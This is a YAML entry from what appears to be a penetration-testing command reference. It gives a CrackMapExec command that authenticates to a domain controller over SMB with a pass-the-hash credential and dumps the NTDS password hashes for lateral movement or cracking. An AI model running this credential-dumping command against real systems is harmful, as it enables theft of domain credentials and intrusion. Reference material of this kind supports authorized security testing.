---
description: |
  "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks." - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will dump the hashes from the DC in order to use them for lateral movement or crack passwords.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: Administrator

  	Password: password123

  	Hash (-H):  807726fcf9f188adc26eeafd7dc16bb7

command: |
  crackmapexec smb 10.10.10.1 -u Administrator -H 807726fcf9f188adc26eeafd7dc16bb7 --ntds
items:
  - Username
  - Password
  - Hash
services:
  - SMB
attack_types:
  - Enumeration
  - Cracking
OS:
  - Linux
references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/wiki
  - https://www.hackingarticles.in/credential-dumping-ntds-dit/
---
